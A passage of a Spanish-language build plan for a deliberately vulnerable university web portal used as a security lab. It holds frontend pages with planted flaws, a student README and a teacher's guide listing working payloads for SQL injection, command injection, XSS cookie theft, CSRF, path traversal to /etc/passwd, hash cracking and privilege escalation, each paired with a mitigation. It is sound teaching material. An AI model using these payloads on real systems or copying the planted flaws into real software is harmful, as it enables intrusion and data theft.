    fetch('/api/session').then(r => { if (r.ok) r.json().then(u => { window.location = '/dashboard.html'; }); });

    document.getElementById('loginForm').addEventListener('submit', async e => {
      e.preventDefault();
      const body = new URLSearchParams(new FormData(e.target));
      const res  = await fetch('/login', { method: 'POST', body });
      const data = await res.json();
      if (!res.ok) {
        document.getElementById('msg').textContent = data.error || 'Error al iniciar sesión';
        return;
      }
      if (data.flag) {
        alert('🚩 FLAG encontrada: ' + data.flag + '\n\nQuery: ' + (data.debug || ''));
      }
      if (data.rol === 'admin')   window.location = '/admin.html';
      else if (data.rol === 'docente') window.location = '/docente.html';
      else window.location = '/dashboard.html';
    });
  </script>
</body>
</html>
```

- [ ] **Step 5: Crear `public/dashboard.html`**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Dashboard — Portal Universitario</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <nav>
    <span>🏛️ Universidad Autónoma — <span id="userName"></span></span>
    <div>
      <a href="/messages">Mensajes</a>
      <a href="/logout">Cerrar sesión</a>
    </div>
  </nav>
  <div class="container">
    <h1>Panel del alumno</h1>

    <!-- Búsqueda de alumnos (SQLi) -->
    <div class="card">
      <h2>🔍 Búsqueda de alumnos</h2>
      <input type="text" id="searchInput" placeholder="Buscar por nombre o usuario...">
      <button onclick="buscar()">Buscar</button>
      <div id="searchResults"></div>
    </div>

    <!-- Descarga de material (LFI) -->
    <div class="card">
      <h2>📁 Material de clase</h2>
      <input type="text" id="fileInput" placeholder="Nombre del archivo (ej: temario_u1.txt)">
      <button onclick="descargar()">Descargar</button>
      <pre id="fileContent" style="margin-top:10px;background:#f5f5f5;padding:10px;border-radius:4px;overflow:auto;"></pre>
      <div id="flagLfi"></div>
    </div>

    <!-- Actualizar perfil (CSRF + privesc) -->
    <div class="card">
      <h2>👤 Mi perfil</h2>
      <input type="password" id="newPass" placeholder="Nueva contraseña">
      <button onclick="actualizarPerfil()">Cambiar contraseña</button>
      <div id="profileMsg"></div>
    </div>
  </div>
  <script src="/js/app.js"></script>
  <script>
    getSession().then(u => { if (u) document.getElementById('userName').textContent = u.nombre; });

    async function buscar() {
      const q = document.getElementById('searchInput').value;
      const res = await fetch('/search?q=' + encodeURIComponent(q));
      const data = await res.json();
      if (!res.ok) { document.getElementById('searchResults').innerHTML = `<p class="error">${data.error}<br><code>${data.query || ''}</code></p>`; return; }
      document.getElementById('searchResults').innerHTML = `
        <p style="font-size:12px;color:#888;margin:8px 0">Query: <code>${data.query}</code></p>
        <table><tr><th>Usuario</th><th>Nombre</th><th>Email</th><th>Rol</th></tr>
        ${data.results.map(u => `<tr><td>${u.username}</td><td>${u.nombre}</td><td>${u.email}</td><td>${u.rol}</td></tr>`).join('')}
        </table>`;
    }

    async function descargar() {
      const file = document.getElementById('fileInput').value;
      const res  = await fetch('/download?file=' + encodeURIComponent(file));
      const data = await res.json();
      document.getElementById('fileContent').textContent = data.content || data.error || '';
      showFlag(data.flag, 'flagLfi');
    }

    async function actualizarPerfil() {
      const password = document.getElementById('newPass').value;
      const res  = await fetch('/profile/update', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ password }) });
      const data = await res.json();
      const msg  = document.getElementById('profileMsg');
      if (data.csrf_flag) msg.innerHTML = `<div class="flag-box">🚩 CSRF Flag: ${data.csrf_flag}</div>`;
      else msg.innerHTML = `<p class="success">${data.message || 'Actualizado'}</p>`;
    }
  </script>
</body>
</html>
```

- [ ] **Step 6: Crear `public/docente.html`**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel Docente — Portal Universitario</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <nav>
    <span>🏛️ Universidad Autónoma — Panel Docente</span>
    <div><a href="/messages">Mensajes</a> <a href="/logout">Cerrar sesión</a></div>
  </nav>
  <div class="container">
    <h1>Bienvenido, <span id="docenteName"></span></h1>
    <div class="card">
      <h2>📋 Lista de alumnos</h2>
      <button onclick="cargarAlumnos()">Cargar alumnos</button>
      <div id="alumnosList" style="margin-top:15px;"></div>
    </div>
    <div class="card">
      <h2>📨 Mensajes recientes</h2>
      <a href="/messages">Ver tablero completo →</a>
    </div>
  </div>
  <script src="/js/app.js"></script>
  <script>
    getSession().then(u => { if (u) document.getElementById('docenteName').textContent = u.nombre; });

    async function cargarAlumnos() {
      const res  = await fetch('/search?q=');
      const data = await res.json();
      document.getElementById('alumnosList').innerHTML = `
        <table><tr><th>Usuario</th><th>Nombre</th><th>Email</th><th>Rol</th></tr>
        ${data.results.map(u=>`<tr><td>${u.username}</td><td>${u.nombre}</td><td>${u.email}</td><td><span class="badge badge-${u.rol}">${u.rol}</span></td></tr>`).join('')}
        </table>`;
    }
  </script>
</body>
</html>
```

- [ ] **Step 7: Crear `public/admin.html`** (incluye comentario HTML con credenciales — exposición intencional)

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel Administrador — Portal Universitario</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <!-- DEBUG: credenciales por defecto: admin / admin123 -->
  <!-- TODO: cambiar contraseña antes de despliegue en producción -->
  <!-- Backup DB disponible en: /db.sqlite -->
  <nav>
    <span>🏛️ Universidad Autónoma — Administración</span>
    <div><a href="/messages">Mensajes</a> <a href="/logout">Cerrar sesión</a></div>
  </nav>
  <div class="container">
    <h1>Panel de Administración</h1>

    <!-- Gestión de usuarios (dato sensible) -->
    <div class="card">
      <h2>👥 Usuarios del sistema</h2>
      <button onclick="cargarUsuarios()">Cargar usuarios</button>
      <div id="userList" style="margin-top:15px;"></div>
    </div>

    <!-- Herramienta de diagnóstico (Command Injection) -->
    <div class="card">
      <h2>🖧 Diagnóstico de red — Ping</h2>
      <input type="text" id="hostInput" placeholder="Host a hacer ping (ej: localhost)">
      <button onclick="hacerPing()">Ejecutar ping</button>
      <pre id="pingOutput" style="margin-top:10px;background:#1b1b1b;color:#00e676;padding:15px;border-radius:6px;min-height:60px;overflow:auto;"></pre>
    </div>

    <!-- Escalación de privilegios -->
    <div class="card">
      <h2>⚙️ Gestión de rol</h2>
      <select id="rolSelect">
        <option value="alumno">alumno</option>
        <option value="docente">docente</option>
        <option value="admin" selected>admin</option>
      </select>
      <button onclick="cambiarRol()">Aplicar rol</button>
      <div id="rolMsg"></div>
    </div>
  </div>
  <script src="/js/app.js"></script>
  <script>
    async function cargarUsuarios() {
      const res  = await fetch('/api/users');
      const data = await res.json();
      document.getElementById('userList').innerHTML = `
        <p>🚩 Flag: <code>${data.flag}</code></p>
        <table><tr><th>ID</th><th>Usuario</th><th>Email</th><th>Rol</th><th>Password (hash)</th></tr>
        ${data.users.map(u=>`<tr><td>${u.id}</td><td>${u.username}</td><td>${u.email}</td><td><span class="badge badge-${u.rol}">${u.rol}</span></td><td><code style="font-size:11px">${u.password}</code></td></tr>`).join('')}
        </table>`;
    }

    async function hacerPing() {
      const host = document.getElementById('hostInput').value;
      const res  = await fetch('/admin/ping?host=' + encodeURIComponent(host));
      const data = await res.json();
      document.getElementById('pingOutput').textContent = `$ ${data.command}\n\n${data.output}`;
    }

    async function cambiarRol() {
      const rol  = document.getElementById('rolSelect').value;
      const res  = await fetch('/profile/update', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ rol }) });
      const data = await res.json();
      const msg  = document.getElementById('rolMsg');
      if (data.flag) msg.innerHTML = `<div class="flag-box">🚩 ${data.flag}</div>`;
      else msg.innerHTML = `<p class="success">${data.message}</p>`;
    }
  </script>
</body>
</html>
```

- [ ] **Step 8: Ejecutar todos los tests para verificar que siguen pasando**

```bash
node --test tests/
```

Salida esperada: todos los tests anteriores pasan; el servidor sirve los archivos HTML correctamente.

- [ ] **Step 9: Commit**

```bash
git add public/ server.js
git commit -m "feat: add frontend pages (login, dashboard, docente, admin) and CSS"
```

---

## Task 12: README.md para alumnos

**Files:**
- Create: `README.md`

- [ ] **Step 1: Crear `README.md`**

```markdown
# Portal Universitario — Laboratorio de Seguridad Web

> **ADVERTENCIA:** Esta aplicación es **INTENCIONALMENTE VULNERABLE**. Usar únicamente en el ambiente local del laboratorio. Está prohibido desplegarlo en redes públicas o usarlo fuera del contexto académico de este curso.

## Requisitos

- Node.js 18 o superior ([nodejs.org](https://nodejs.org))
- Sistema operativo: Linux, macOS o Windows (WSL recomendado)

## Instalación e inicio

```bash
git clone <URL-del-repositorio>
cd projecto-final
npm install
npm start
```

Abrir el navegador en: **http://localhost:3000**

## Cuentas de prueba

| Usuario | Contraseña | Rol |
|---|---|---|
| `admin` | `admin123` | Administrador |
| `prof_garcia` | `docente123` | Docente |
| `alumno_lopez` | `alumno123` | Alumno |
| `alumno_perez` | `alumno456` | Alumno |

## Módulos del portal

| Módulo | URL | Descripción |
|---|---|---|
| Login | `/` | Inicio de sesión |
| Dashboard alumno | `/dashboard.html` | Búsqueda, descargas, perfil |
| Panel docente | `/docente.html` | Lista de alumnos y mensajes |
| Panel admin | `/admin.html` | Gestión de usuarios y diagnóstico |
| Mensajes | `/messages` | Tablero de mensajes del portal |

## Herramientas recomendadas

- **OWASP ZAP** — escaneo automatizado de vulnerabilidades
- **Nikto** — escaneo de servidor web
- **Burp Suite** (Community Edition) — intercepción y modificación de tráfico HTTP

## Entregable

Reporte en PDF o Word que incluya por cada vulnerabilidad encontrada:
1. **Nombre** de la vulnerabilidad (clasificación OWASP)
2. **Evidencia** — captura de pantalla del exploit y la flag obtenida
3. **Descripción** — cómo funciona la vulnerabilidad en este contexto
4. **Mitigación propuesta** — código o configuración que corregiría el problema

## Reinicio del laboratorio

Si necesitas volver al estado inicial de la base de datos:

```bash
rm db.sqlite
npm start
```
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: add README with lab setup and usage instructions for students"
```

---

## Task 13: Guía del docente

**Files:**
- Create: `docs/guia-docente.md`

- [ ] **Step 1: Crear `docs/guia-docente.md`**

```markdown
# Guía del Docente — Laboratorio de Seguridad Web

Documento de uso exclusivo del profesor. Contiene los payloads exactos, flags esperadas y criterios de evaluación para cada vulnerabilidad.

---

## Reinicio limpio de la base de datos

```bash
rm db.sqlite && npm start
```

---

## Vulnerabilidad 1 — SQL Injection

**Flag:** `FLAG{sql_1nj3ct10n}`
**Módulo:** Login (`/`) y Búsqueda (`/dashboard.html`)

### Detección con OWASP ZAP / Nikto
```bash
nikto -h http://localhost:3000
```
ZAP: Active Scan sobre `/login` y `/search` detectará SQLi automáticamente.

### Explotación manual — Bypass de login
1. En el campo **Usuario** ingresar: `' OR '1'='1' --`
2. En **Contraseña** cualquier valor.
3. La respuesta JSON incluirá `flag` y `debug` con la query ejecutada.

### Explotación manual — UNION SELECT en búsqueda
Con Burp Suite, interceptar `GET /search?q=test` y modificar:
```
GET /search?q=' UNION SELECT id, flag, flag, flag, flag FROM flags -- HTTP/1.1
```
Los resultados incluirán la flag de la tabla `flags`.

### Validación en el reporte del alumno
- Captura de la respuesta JSON con el campo `flag`.
- Captura de los resultados de búsqueda con la flag de la UNION.
- Mitigación esperada: uso de sentencias preparadas (`db.prepare('... WHERE username = ?').get(username, hash)`).

---

## Vulnerabilidad 2 — Inyección de Comandos

**Flag:** `FLAG{cmd_1nj3ct10n}` (contenida en `flag_cmd.txt` en el servidor)
**Módulo:** Panel Admin → Diagnóstico de red (`/admin.html`)

### Detección
Nikto detectará el endpoint. ZAP puede detectar OS Command Injection en active scan.

### Explotación manual
1. Iniciar sesión con cualquier cuenta (el endpoint no valida rol).
2. Navegar a `/admin.html` (o usar Burp para acceder directamente a `/admin/ping`).
3. En el campo **Host** ingresar:
   ```
   localhost; cat flag_cmd.txt
   ```
4. El output mostrará el resultado del ping Y el contenido de `flag_cmd.txt`.

### Variantes de payload
```bash
localhost; id
localhost; whoami
localhost && cat flag_cmd.txt
localhost | cat flag_cmd.txt
```

### Validación en el reporte del alumno
- Captura del output mostrando `FLAG{cmd_1nj3ct10n}` junto al resultado del ping.
- Mitigación esperada: validar que `host` solo contenga caracteres alfanuméricos y puntos; usar `execFile` en lugar de `exec`.

---

## Vulnerabilidad 3 — XSS (Stored + Reflected)

**Flag:** `FLAG{xss_st0r3d}` (obtenida llamando a `/api/xss-flag` mediante el payload)
**Módulo:** Mensajes (`/messages`)

### Detección
ZAP y Nikto detectarán XSS Reflected en el parámetro `?msg=`. ZAP detectará XSS Stored al enviar un mensaje con payload.

### Explotación — XSS Reflected
En el navegador, abrir:
```
http://localhost:3000/messages?msg=<script>alert(document.cookie)</script>
```
El script se ejecuta. La cookie de sesión es visible porque `httpOnly: false`.

### Explotación — XSS Stored + obtención de flag
1. En el tablero de mensajes, enviar como contenido:
   ```html
   <script>fetch('/api/xss-flag').then(r=>r.json()).then(d=>alert('Flag: '+d.flag))</script>
   ```
2. Recargar `/messages`. El script se ejecuta y muestra la flag en un alert.
3. Alternativa para demostrar robo de sesión:
   ```html
   <script>fetch('/api/xss-flag').then(r=>r.json()).then(d=>{document.body.innerHTML='<h1 style="color:red">XSS ejecutado!</h1><p>'+d.flag+'</p>';});</script>
   ```

### Validación en el reporte del alumno
- Captura del alert con la flag o la cookie de sesión.
- Mitigación esperada: escapar HTML en el servidor antes de insertar en la respuesta (`he.escape()` o equivalente); CSP headers; `httpOnly: true` en la cookie.

---

## Vulnerabilidad 4 — CSRF

**Flag:** `FLAG{csrf_4tt4ck}`
**Módulo:** Actualización de perfil (`POST /profile/update`)

### Detección
ZAP detecta ausencia de token CSRF en formularios. Burp Suite → CSRF PoC Generator.

### Explotación manual
1. Iniciar sesión como `alumno_lopez` en el navegador.
2. Crear un archivo `csrf_poc.html` en cualquier directorio local:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
   <h1>Página de ataque CSRF</h1>
   <script>
     fetch('http://localhost:3000/profile/update', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       credentials: 'include',
       body: JSON.stringify({ password: 'hackeado123' })
     }).then(r => r.json()).then(d => {
       document.write('<h2>Respuesta del servidor:</h2><pre>' + JSON.stringify(d, null, 2) + '</pre>');
     });
   </script>
   </body>
   </html>
   ```
3. Abrir `csrf_poc.html` en el mismo navegador (otra pestaña). La cookie se envía automáticamente.
4. La respuesta incluye `csrf_flag: "FLAG{csrf_4tt4ck}"`.

### Validación en el reporte del alumno
- Captura de la respuesta con la flag.
- Mitigación esperada: implementar token CSRF (sincronizador o double-submit cookie); `SameSite: Strict` en la cookie.

---

## Vulnerabilidad 5 — Inclusión de Archivos (Path Traversal)

**Flag:** `FLAG{f1l3_1nclus10n}` (contenida en `secret_lfi.txt` en la raíz del proyecto)
**Módulo:** Descarga de material (`/download`)

### Detección
Nikto y ZAP detectan path traversal en parámetros de archivo.

### Explotación manual
En el campo de descarga del dashboard, ingresar:
```
../../secret_lfi.txt
```
O con Burp:
```
GET /download?file=../../secret_lfi.txt HTTP/1.1
```
La respuesta JSON incluye `content` con la flag y el campo `flag`.

### Variantes
```
../../flag_cmd.txt          → también funciona, revela flag de cmd injection
../../../etc/passwd         → funciona en Linux, muestra /etc/passwd
```

### Validación en el reporte del alumno
- Captura del JSON con el contenido de `secret_lfi.txt` y la flag.
- Mitigación esperada: usar `path.resolve()` y verificar que el resultado empiece con el directorio base; usar una lista blanca de archivos permitidos.

---

## Vulnerabilidad 6 — Exposición de Datos Sensibles

**Flag:** `FLAG{s3ns1t1v3_d4t4}` (retornada por `/api/users`)
**Módulo:** Múltiples superficies

### Superficies vulnerables

| Superficie | Cómo acceder |
|---|---|
| `/api/users` sin auth | `curl http://localhost:3000/api/users` |
| `db.sqlite` descargable | `curl -O http://localhost:3000/db.sqlite` |
| Comentario HTML con credenciales | Ver código fuente de `/admin.html` |
| Hashes MD5 débiles | Ver campo `password` en `/api/users` o en `db.sqlite` |

### Explotación manual — /api/users
```bash
curl http://localhost:3000/api/users | python3 -m json.tool
```
Retorna usuarios con hashes MD5 y la flag.

### Crackear hash MD5
```bash
echo -n "admin123" | md5sum
# O usar: https://crackstation.net (en ambiente offline: hashcat)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### Explotación — db.sqlite
```bash
curl -O http://localhost:3000/db.sqlite
sqlite3 db.sqlite "SELECT username, password FROM usuarios;"
```

### Validación en el reporte del alumno
- Captura de `/api/users` con hashes expuestos y la flag.
- Captura del código fuente HTML con el comentario de credenciales.
- Mitigación esperada: autenticar y autorizar `/api/users`; no servir `db.sqlite` estáticamente; usar bcrypt en lugar de MD5; eliminar comentarios con información sensible.

---

## Vulnerabilidad 7 — Escalamiento de Privilegios Vertical

**Flag:** `FLAG{pr1v_3sc4l4t10n}`
**Módulo:** Actualización de perfil (`POST /profile/update`)

### Detección
Requiere validación manual: interceptar la petición de actualización de perfil con Burp y añadir el campo `rol`.

### Explotación manual con Burp Suite
1. Iniciar sesión como `alumno_lopez`.
2. En Burp, interceptar `POST /profile/update` desde el dashboard.
3. Modificar el body para incluir `rol`:
   ```json
   {"password": "alumno123", "rol": "admin"}
   ```
4. La respuesta incluye `flag: "FLAG{pr1v_3sc4l4t10n}"`.
5. Al recargar, el usuario ahora tiene rol `admin` y puede acceder a `/admin.html`.

### Explotación con curl
```bash
# 1. Login y guardar cookie
curl -c cookies.txt -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alumno_lopez","password":"alumno123"}'

# 2. Escalar privilegios
curl -b cookies.txt -X POST http://localhost:3000/profile/update \
  -H "Content-Type: application/json" \
  -d '{"rol":"admin"}'
```

### Validación en el reporte del alumno
- Captura de la respuesta con la flag.
- Captura de la sesión después del cambio (rol = admin).
- Mitigación esperada: el servidor debe ignorar el campo `rol` enviado por el cliente; los cambios de rol deben hacerse solo por un administrador autenticado en un endpoint separado.

---

## Criterios de evaluación sugeridos

| Criterio | Puntos |
|---|---|
| Identificación correcta de la vulnerabilidad (nombre OWASP) | 1 pt |
| Evidencia de explotación (flag obtenida + captura) | 2 pt |
| Descripción técnica del mecanismo vulnerable | 1 pt |
| Propuesta de mitigación técnica concreta | 2 pt |
| **Total por vulnerabilidad** | **6 pt** |
| **Total del proyecto (7 vulns)** | **42 pt** |
```

- [ ] **Step 2: Commit**

```bash
git add docs/guia-docente.md
git commit -m "docs: add step-by-step professor guide with payloads and evaluation criteria"
```

---

## Task 14: Verificación final

- [ ] **Step 1: Ejecutar suite de tests completa**

```bash
node --test tests/
```

Salida esperada: todos los tests pasan (excepto posiblemente el test de command injection si `ping` no está disponible en el entorno de CI — esto es esperado).

- [ ] **Step 2: Arrancar el servidor y verificar manualmente**

```bash
npm start
```

Verificar en el navegador:
- `http://localhost:3000` — muestra el formulario de login
- Login con `alumno_lopez / alumno123` → redirige a dashboard
- Login con `admin / admin123` → redirige a admin panel
- `http://localhost:3000/api/users` sin login → retorna usuarios con hashes y flag
- `http://localhost:3000/db.sqlite` → descarga el archivo de base de datos

- [ ] **Step 3: Commit final**

```bash
git add .
git commit -m "feat: complete vulnerable web lab - all 7 OWASP vulnerabilities implemented"
```
